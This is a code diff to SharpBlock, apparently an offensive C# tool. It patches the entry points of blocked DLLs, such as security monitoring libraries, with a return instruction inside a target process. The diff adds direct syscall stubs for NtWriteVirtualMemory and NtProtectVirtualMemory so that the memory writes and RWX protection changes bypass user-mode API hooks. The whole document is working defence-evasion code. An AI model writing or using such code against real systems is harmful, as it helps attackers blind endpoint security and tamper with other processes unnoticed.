@@ -21,6 +21,19 @@ namespace SharpBlock {
 
     class Program {
 
+        //SharpSploit.Execution.PE.PE_MANUAL_MAP ntdll = Execute.ManualMap.Map.MapModuleFromDisk(@"c:\windows\system32\ntdll.dll");
+        static Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemorySysCall;
+        static Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemorySysCall;
+
+        static Program() {
+            NtWriteVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory"));
+            NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
+        }
+
+        static D GetDelagateForSysCall<D>(IntPtr syscallStub) where D : Delegate {
+            return (D)Marshal.GetDelegateForFunctionPointer(syscallStub, typeof(D));
+        }
+
         public struct HostProcessInfo {
             public IntPtr newLoadAddress;
             public IntPtr newEntryPoint;
@@ -63,6 +76,22 @@ namespace SharpBlock {
                 return true;
 
             return false;
+        }
+
+        static bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] data, int size, out uint bytesWritten) {
+
+            IntPtr regionSize = (IntPtr)size;            
+            IntPtr protectionBase = baseAddress;
+            uint oldProtect = 0;
+            bytesWritten = 0;
+            GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
+            IntPtr intptrData = pinnedArray.AddrOfPinnedObject();
+
+            uint result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, 0x40 /*RWX*/, ref oldProtect);
+            result = NtWriteVirtualMemorySysCall(hProcess, baseAddress, intptrData, (uint)size, ref bytesWritten);
+            result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, oldProtect, ref oldProtect);
+
+            return result == 0;
         }
 
         static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {
@@ -116,11 +145,11 @@ namespace SharpBlock {
                 Console.WriteLine($"[+] Blocked DLL {dllPath}");
 
                 byte[] retIns = new byte[1] { 0xC3 };
-                IntPtr bytesWritten;
+                uint bytesWritten;
 
                 Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());
 
-                if (WinAPI.WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
+                if (WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
                     Console.WriteLine("[+] Successfully patched DLL Entry Point");
                 } else {
                     Console.WriteLine("[!] Failed patched DLL Entry Point");
